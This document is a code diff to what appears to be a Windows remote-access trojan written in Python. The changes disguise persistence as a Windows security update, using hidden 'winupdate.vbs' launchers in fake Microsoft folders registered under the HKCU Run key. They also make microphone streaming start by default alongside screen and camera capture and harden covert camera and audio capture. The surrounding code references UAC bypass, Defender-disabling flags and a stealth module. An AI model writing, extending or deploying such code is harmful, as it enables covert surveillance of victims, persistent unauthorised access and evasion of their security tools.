@@ -784,14 +784,14 @@ def _resolve_controller_url():
     candidates = [
         v1,
         v2,
-        'https://neural-control-hub.onrender.com',
-        'https://agent-controller-backend.onrender.com',
+        'http://localhost:8080',
+        'http://localhost:8080',
         'http://localhost:8080',
     ]
     for u in candidates:
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'https://neural-control-hub.onrender.com'
+    return 'http://localhost:8080'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
@@ -1483,8 +1483,8 @@ SERVER_URL = FIXED_SERVER_URL
 EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
 DEFENDER_DISABLE_ENABLED = False
 DEFENDER_TAMPER_DISABLE_ENABLED = False
-AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '0') == '1'
-AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '0') == '1'
+AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '1') == '1'
+AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '1') == '1'
 SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(2 * 1024 * 1024)))
 def _default_upload_dir():
     try:
@@ -1572,6 +1572,8 @@ MIC_VOLUME = 1.0
 SYSTEM_VOLUME = 1.0
 NOISE_REDUCTION_ENABLED = False
 ECHO_CANCELLATION_ENABLED = False
+AUDIO_ENCODING_OPUS_ENABLED = False
+AUDIO_TEST_TONE_ON_START = os.environ.get('AUDIO_TEST_TONE_ON_START', '0') == '1'
 
 # Thread safety locks for start/stop functions
 _stream_lock = threading.Lock()
@@ -1680,10 +1682,40 @@ keyboard_controller = None
 low_latency_available = False
 
 # Clipboard and monitoring
-CHUNK = 1024
+CHUNK = 882
 # FORMAT already defined above based on pyaudio availability
 CHANNELS = 1
 RATE = 44100
+def init_audio_params():
+    """Detect optimal audio rate and 20ms chunk for smooth capture."""
+    global RATE, CHUNK
+    try:
+        detected_rate = None
+        if PYAUDIO_AVAILABLE:
+            try:
+                p = pyaudio.PyAudio()
+                info = p.get_default_input_device_info()
+                detected_rate = int(info.get('defaultSampleRate') or 0)
+                p.terminate()
+            except Exception:
+                pass
+        if detected_rate is None:
+            try:
+                import sounddevice as sd
+                info = sd.query_devices(None, 'input')
+                detected_rate = int(info.get('default_samplerate') or 0)
+            except Exception:
+                pass
+        if not detected_rate or detected_rate <= 0:
+            detected_rate = 44100
+        # Snap to common rates for consistency
+        RATE = 48000 if abs(detected_rate - 48000) < abs(detected_rate - 44100) else 44100
+        CHUNK = 960 if RATE == 48000 else 882
+        log_message(f"[AUDIO] Initialized params: RATE={RATE}, CHUNK={CHUNK}")
+    except Exception as e:
+        RATE = 44100
+        CHUNK = 882
+        log_message(f"[AUDIO] Using defaults due to detection error: {e}")
 
 # Connection Health Monitor
 CONNECTION_STATE = {
@@ -1958,6 +1990,7 @@ def ensure_prerequisites():
         'opencv-python>=4.7.0.72',
         'pillow>=9.5.0',
         'PyTurboJPEG>=1.7.0',
+        'sounddevice>=0.5.2',
         'pynput>=1.8.1',
         'keyboard>=0.13.5',
         'pyautogui>=0.9.54',
@@ -5859,27 +5892,37 @@ def registry_run_key_persistence():
     """Establish persistence via registry Run keys."""
     try:
         import winreg
-        
-        if hasattr(sys, 'frozen') and sys.frozen:
-            current_exe = sys.executable
-        else:
-            script_path = os.path.abspath(__file__)
-            pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
-            if os.path.exists(pyw):
-                current_exe = f'"{pyw}" "{script_path}"'
-            else:
-                vdir = os.path.join(os.environ.get('APPDATA', ''), "ClientLauncher")
-                os.makedirs(vdir, exist_ok=True)
-                vbs_path = os.path.join(vdir, "client_autostart.vbs")
-                cmd = f'"{sys.executable}" "{script_path}"'
-                vbs = (
-                    'Set oShell = CreateObject("WScript.Shell")\n'
-                    f'oShell.CurrentDirectory = "{os.path.dirname(script_path)}"\n'
-                    f'oShell.Run "{cmd}", 0, false\n'
-                )
-                with open(vbs_path, 'w') as f:
-                    f.write(vbs)
-                current_exe = f'wscript.exe "{vbs_path}"'
+        script_path = os.path.abspath(__file__)
+        def _build_hidden_vbs(path_list):
+            runner = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+            if not os.path.exists(runner):
+                runner = sys.executable
+            vbs = (
+                'Set oShell = CreateObject("WScript.Shell")\n'
+                f'oShell.CurrentDirectory = "{os.path.dirname(script_path)}"\n'
+                f'oShell.Run "\"{runner}\" \"{script_path}\"", 0, false\n'
+            )
+            for p in path_list:
+                try:
+                    d = os.path.dirname(p)
+                    os.makedirs(d, exist_ok=True)
+                    with open(p, 'w', encoding='utf-8') as f:
+                        f.write(vbs)
+                    try:
+                        subprocess.run(['attrib', '+s', '+h', p], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
+                    except Exception:
+                        pass
+                    return p
+                except Exception:
+                    continue
+            return None
+        hidden_candidates = [
+            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
+            os.path.join(tempfile.gettempdir(), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
+        ]
+        hidden_vbs = _build_hidden_vbs(hidden_candidates)
+        current_exe = f'wscript.exe "{hidden_vbs}"' if hidden_vbs else f'"{sys.executable}" "{script_path}"'
         
         log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
         
@@ -5919,6 +5962,22 @@ def registry_run_key_persistence():
     except Exception as e:
         log_message(f"[REGISTRY] Registry persistence failed: {e}")
         return False
+
+def cleanup_startup_folder_artifacts():
+    """Remove legacy startup folder .vbs/.bat artifacts."""
+    try:
+        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+        targets = ["ClientService.vbs", "SystemService.bat"]
+        for name in targets:
+            p = os.path.join(startup_folder, name)
+            try:
+                if os.path.exists(p):
+                    os.remove(p)
+                    log_message(f"[CLEANUP] Removed startup artifact: {p}")
+            except Exception as e:
+                log_message(f"[CLEANUP] Failed to remove {p}: {e}", "warning")
+    except Exception as e:
+        log_message(f"[CLEANUP] Startup folder cleanup error: {e}", "warning")
 def startup_folder_persistence():
     return False
 
@@ -6664,20 +6723,27 @@ def self_deploy_powershell():
             shutil.copy2(current_exe, backup_path)
             log_message(f"[OK] Executable copied to stealth locations")
         else:
-            # For Python script, create batch wrappers
-            stealth_batch = stealth_path.replace('.exe', '.bat')
-            backup_batch = backup_path.replace('.exe', '.bat')
-            
-            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
-            
-            with open(stealth_batch, 'w') as f:
-                f.write(batch_content)
-            with open(backup_batch, 'w') as f:
-                f.write(batch_content)
-                
-            stealth_path = stealth_batch
-            backup_path = backup_batch
-            log_message(f"[OK] Batch wrappers created for Python script")
+            # For Python script, use hidden VBS launcher instead of batch wrappers
+            hidden_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate')
+            os.makedirs(hidden_dir, exist_ok=True)
+            stealth_vbs = os.path.join(hidden_dir, 'winupdate.vbs')
+            runner = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+            if not os.path.exists(runner):
+                runner = sys.executable
+            vbs_content = (
+                'Set oShell = CreateObject("WScript.Shell")\n'
+                f'oShell.CurrentDirectory = "{os.path.dirname(current_exe)}"\n'
+                f'oShell.Run "\"{runner}\" \"{current_exe}\"", 0, false\n'
+            )
+            with open(stealth_vbs, 'w', encoding='utf-8') as f:
+                f.write(vbs_content)
+            try:
+                subprocess.run(['attrib', '+s', '+h', stealth_vbs], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
+            except Exception:
+                pass
+            stealth_path = stealth_vbs
+            backup_path = stealth_vbs
+            log_message(f"[OK] Hidden VBS launcher created for Python script")
         
         # Set hidden attributes
         subprocess.run(['attrib', '+s', '+h', stealth_path], 
@@ -6691,10 +6757,8 @@ def self_deploy_powershell():
         # Add to registry using PowerShell
         powershell_script = f'''
 $stealthPath = "{stealth_path}"
-$backupPath = "{backup_path}"
-# Add to registry
-reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "svchost32" /t REG_SZ /d $stealthPath /f
-reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "svchost32" /t REG_SZ /d $stealthPath /f
+# Add to registry (HKCU Run) to launch hidden VBS at logon
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
 Write-Host "Registry persistence established"
 '''
         
@@ -9259,16 +9323,41 @@ def camera_capture_worker(agent_id):
     
     cap = None
     try:
-        # Try to open camera (try multiple indices)
-        for camera_index in range(3):  # Try cameras 0, 1, 2
+        # Try to open camera with multiple indices and backends
+        env_idx = os.environ.get('CAMERA_INDEX')
+        indices = [int(env_idx)] if env_idx and env_idx.isdigit() else [0, 1, 2, 3]
+        backends = []
+        try:
+            backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF]
+        except Exception:
+            backends = []
+        opened = False
+        for camera_index in indices:
+            # Try default first
             cap = cv2.VideoCapture(camera_index)
             if cap.isOpened():
-                log_message(f"Camera {camera_index} opened successfully")
+                log_message(f"Camera {camera_index} opened successfully (default backend)")
+                opened = True
                 break
-            cap.release()
+            # Try OS-specific backends
+            for api_pref in backends:
+                try:
+                    cap = cv2.VideoCapture(camera_index, api_pref)
+                    if cap.isOpened():
+                        log_message(f"Camera {camera_index} opened successfully (backend {api_pref})")
+                        opened = True
+                        break
+                except Exception:
+                    pass
+            if opened:
+                break
+            try:
+                cap.release()
+            except Exception:
+                pass
             cap = None
         
-        if not cap or not cap.isOpened():
+        if not opened or not cap or not cap.isOpened():
             log_message("Error: Could not open any camera - switching to synthetic stream", "warning")
             synthetic_mode = True
         else:
@@ -9309,12 +9398,18 @@ def camera_capture_worker(agent_id):
                 else:
                     ret, frame = cap.read()
                     if not ret:
-                        log_message("Failed to capture camera frame - switching to synthetic", "warning")
-                        synthetic_mode = True
-                        if cap:
-                            cap.release()
+                        consecutive_errors += 1
+                        if consecutive_errors >= 5:
+                            log_message("Failed to capture camera frame repeatedly - switching to synthetic", "warning")
+                            synthetic_mode = True
+                            try:
+                                if cap:
+                                    cap.release()
+                            except Exception:
+                                pass
                             cap = None
-                        continue
+                            consecutive_errors = 0
+                            continue
                 
                 if not ret:
                     time.sleep(0.1)
@@ -9550,12 +9645,50 @@ def audio_capture_worker(agent_id):
     """Capture audio frames from microphone and put in capture queue."""
     global AUDIO_STREAMING_ENABLED, audio_capture_queue
     
-    if not PYAUDIO_AVAILABLE or FORMAT is None:
-        log_message("Error: PyAudio not available for audio capture", "error")
-        return
-    
     if audio_capture_queue is None:
         log_message("Error: Audio capture queue not initialized", "error")
+        return
+    
+    if not PYAUDIO_AVAILABLE or FORMAT is None:
+        # Fallback to sounddevice if PyAudio is unavailable
+        try:
+            import sounddevice as sd
+            import numpy as _np
+        except Exception:
+            log_message("Error: No audio capture library available (PyAudio/sounddevice)", "error")
+            return
+        stream = None
+        try:
+            stream = sd.InputStream(
+                samplerate=RATE,
+                channels=CHANNELS,
+                dtype='int16',
+                blocksize=CHUNK,
+                callback=lambda indata, frames, time_info, status: (
+                    (audio_capture_queue.put_nowait(indata.tobytes()))
+                    if not audio_capture_queue.full()
+                    else (
+                        audio_capture_queue.get_nowait(),
+                        audio_capture_queue.put_nowait(indata.tobytes())
+                    )
+                )
+            )
+            stream.start()
+            log_message("Audio capture started (sounddevice fallback)")
+            while AUDIO_STREAMING_ENABLED:
+                time.sleep(0.02)
+        except KeyboardInterrupt:
+            log_message("Audio capture worker interrupted")
+        except Exception as e:
+            log_message(f"Audio capture initialization error (sounddevice): {e}")
+        finally:
+            try:
+                if stream:
+                    stream.stop()
+                    stream.close()
+            except Exception:
+                pass
+            log_message("Audio capture stopped (sounddevice)")
         return
     
     p = None
@@ -9601,7 +9734,9 @@ def audio_capture_worker(agent_id):
                     except queue.Empty:
                         pass
                 
-                time.sleep(0.02)  # 20ms for 50 FPS
+                # Pace based on chunk size and sample rate (~20ms)
+                frame_time = CHUNK / float(RATE)
+                time.sleep(max(0.0, frame_time * 0.9))
             except KeyboardInterrupt:
                 log_message("Audio capture worker interrupted")
                 break
@@ -9663,8 +9798,8 @@ def audio_encode_worker(agent_id):
                 except Exception:
                     pass
                 
-                # Encode with Opus if available, otherwise use PCM
-                if encoder:
+                # Encode with Opus if enabled and available, otherwise use PCM
+                if encoder and AUDIO_ENCODING_OPUS_ENABLED:
                     try:
                         # Convert PCM to Opus
                         if not NUMPY_AVAILABLE:
@@ -9974,6 +10109,10 @@ def start_audio_streaming(agent_id):
                 return
             
             AUDIO_STREAMING_ENABLED = True
+            try:
+                init_audio_params()
+            except Exception:
+                pass
             
             # Try WebRTC first for low latency
             if AIORTC_AVAILABLE and WEBRTC_ENABLED:
@@ -10004,6 +10143,33 @@ def start_audio_streaming(agent_id):
             AUDIO_STREAM_THREADS = threads
             log_message("Started Socket.IO Opus audio streaming pipeline (fallback mode).")
             emit_system_notification('success', 'Audio Stream Started', 'Socket.IO audio streaming started successfully')
+            try:
+                if AUDIO_TEST_TONE_ON_START and audio_encode_queue is not None:
+                    sr = RATE if isinstance(RATE, int) else 44100
+                    dur = 1.0
+                    hz = 440.0
+                    n = int(sr * dur)
+                    try:
+                        import numpy as _np
+                        t = _np.arange(n) / float(sr)
+                        wave = (0.3 * _np.sin(2.0 * _np.pi * hz * t)).astype(_np.float32)
+                        pcm = (wave * 32767.0).astype(_np.int16).tobytes()
+                    except Exception:
+                        import math
+                        pcm = bytearray()
+                        for i in range(n):
+                            v = int(0.3 * 32767.0 * math.sin(2.0 * math.pi * hz * (i / float(sr))))
+                            pcm += (v & 0xFFFF).to_bytes(2, byteorder='little', signed=True)
+                        pcm = bytes(pcm)
+                    # Inject a few chunks to ensure audible beep
+                    for _ in range(5):
+                        try:
+                            audio_encode_queue.put_nowait(pcm)
+                        except Exception:
+                            break
+                    log_message("[AUDIO] Injected test tone to verify playback")
+            except Exception:
+                pass
             
     except Exception as e:
         log_message(f"Failed to start audio streaming: {e}", "error")
@@ -16505,93 +16671,52 @@ def add_registry_startup():
     try:
         import winreg
         
-        # Determine the current executable path
-        if hasattr(sys, 'frozen') and sys.frozen:
-            # Running as compiled executable (PyInstaller)
-            current_exe = sys.executable
-            log_message(f"[DEBUG] Running as compiled exe: {current_exe}")
-        else:
-            # Running as Python script
-            current_exe = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
-            log_message(f"[DEBUG] Running as Python script: {current_exe}")
-        
-        # Define the stealth deployment path
-        stealth_exe_path = os.path.join(
-            os.environ.get('LOCALAPPDATA', ''),
-            'Microsoft',
-            'Windows',
-            'svchost32.exe'
-        )
-        
-        # Check if we need to deploy to stealth location first
-        if not os.path.exists(stealth_exe_path):
-            log_message("[INFO] Deploying to stealth location...")
-            try:
-                # Create directory if it doesn't exist
-                os.makedirs(os.path.dirname(stealth_exe_path), exist_ok=True)
-                
-                if hasattr(sys, 'frozen') and sys.frozen:
-                    # Copy the compiled executable
-                    import shutil
-                    shutil.copy2(sys.executable, stealth_exe_path)
-                    log_message(f"[OK] Executable deployed to: {stealth_exe_path}")
-                else:
-                    log_message("[WARN] Cannot deploy Python script as executable - run PyInstaller first", "warning")
-                    # For Python script, create a batch wrapper
-                    batch_path = stealth_exe_path.replace('.exe', '.bat')
-                    with open(batch_path, 'w') as f:
-                        f.write(f'@echo off\ncd /d "{os.path.dirname(os.path.abspath(__file__))}"\npython.exe "{os.path.basename(os.path.abspath(__file__))}"\n')
-                    stealth_exe_path = batch_path
-                    log_message(f"[OK] Batch wrapper deployed to: {stealth_exe_path}")
-                
-                # Set hidden and system attributes
+        cleanup_startup_folder_artifacts()
+        script_path = os.path.abspath(__file__)
+        def _build_hidden_vbs(path_list):
+            runner = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+            if not os.path.exists(runner):
+                runner = sys.executable
+            vbs = (
+                'Set oShell = CreateObject("WScript.Shell")\n'
+                f'oShell.CurrentDirectory = "{os.path.dirname(script_path)}"\n'
+                f'oShell.Run "\"{runner}\" \"{script_path}\"", 0, false\n'
+            )
+            for p in path_list:
                 try:
-                    subprocess.run(['attrib', '+s', '+h', stealth_exe_path], 
-                                 creationflags=subprocess.CREATE_NO_WINDOW, check=False)
-                except:
-                    pass
-                    
-            except Exception as deploy_error:
-                log_message(f"[ERROR] Failed to deploy to stealth location: {deploy_error}")
-                # Fall back to current location
-                stealth_exe_path = current_exe
-        else:
-            log_message(f"[INFO] Stealth executable already exists: {stealth_exe_path}")
-        
-        launcher_cmd = stealth_exe_path
-        if not (hasattr(sys, 'frozen') and sys.frozen):
-            try:
-                script_path = os.path.abspath(__file__)
-                pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
-                if os.path.exists(pyw):
-                    launcher_cmd = f'"{pyw}" "{script_path}"'
-                else:
-                    vdir = os.path.join(os.environ.get('APPDATA', ''), "ClientLauncher")
-                    os.makedirs(vdir, exist_ok=True)
-                    vbs_path = os.path.join(vdir, "client_autostart.vbs")
-                    cmd = f'"{sys.executable}" "{script_path}"'
-                    vbs = (
-                        'Set oShell = CreateObject("WScript.Shell")\n'
-                        f'oShell.CurrentDirectory = "{os.path.dirname(script_path)}"\n'
-                        f'oShell.Run "{cmd}", 0, false\n'
-                    )
-                    with open(vbs_path, 'w') as f:
+                    d = os.path.dirname(p)
+                    os.makedirs(d, exist_ok=True)
+                    with open(p, 'w', encoding='utf-8') as f:
                         f.write(vbs)
-                    launcher_cmd = f'wscript.exe "{vbs_path}"'
-            except Exception:
-                launcher_cmd = stealth_exe_path
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
-                              r"Software\Microsoft\Windows\CurrentVersion\Run")
-        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, launcher_cmd)
+                    try:
+                        subprocess.run(['attrib', '+s', '+h', p], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
+                    except Exception:
+                        pass
+                    return p
+                except Exception:
+                    continue
+            return None
+        hidden_candidates = [
+            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
+            os.path.join(tempfile.gettempdir(), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
+        ]
+        hidden_vbs = _build_hidden_vbs(hidden_candidates)
+        # Set HKCU Run to hidden VBS
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+        if hidden_vbs:
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'wscript.exe "{hidden_vbs}"')
+        else:
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
         winreg.CloseKey(key)
         
-        log_message(f"[OK] Registry persistence established: {stealth_exe_path}")
+        log_message(f"[OK] Registry persistence established (hidden VBS): {hidden_vbs or script_path}")
         
         # Verify the registry entry was created
         try:
             verify_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                       r"Software\Microsoft\Windows\CurrentVersion\Run")
-            value, _ = winreg.QueryValueEx(verify_key, "svchost32")
+            value, _ = winreg.QueryValueEx(verify_key, "WindowsSecurityUpdate")
             winreg.CloseKey(verify_key)
             log_message(f"[DEBUG] Registry entry verified: svchost32 = {value}")
         except Exception as verify_error:
@@ -16710,6 +16835,23 @@ class FileSystemManager:
                 up['chunks'].sort(key=lambda x: x[0])
                 file_data = b''.join([c for _, c in up['chunks']])
                 dest_dir = up.get('destination') or os.path.expanduser('~')
+                try:
+                    import re
+                    # Normalize Windows-style rootless paths like "/cc" -> "C:\cc"
+                    if os.name == 'nt':
+                        raw = str(dest_dir).strip()
+                        if raw and not re.match(r'^[A-Za-z]:', raw):
+                            if raw.startswith('/') or raw.startswith('\\'):
+                                drive = os.environ.get('SystemDrive', 'C:')
+                                dest_dir = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
+                            else:
+                                dest_dir = os.path.normpath(os.path.join(os.getcwd(), raw))
+                        else:
+                            dest_dir = os.path.normpath(raw or os.path.expanduser('~'))
+                    else:
+                        dest_dir = os.path.normpath(dest_dir)
+                except Exception:
+                    pass
                 os.makedirs(dest_dir, exist_ok=True)
                 full_path = os.path.join(dest_dir, up['filename'])
                 with open(full_path, 'wb') as f:
@@ -18101,6 +18243,10 @@ def agent_main():
         ensure_prerequisites()
     except Exception as e:
         log_message(f"[PREREQ] Error ensuring prerequisites: {e}", "warning")
+    try:
+        cleanup_startup_folder_artifacts()
+    except Exception:
+        pass
     # Initialize stealth enhancer hooks if available
     try:
         if STEALTH_AVAILABLE:
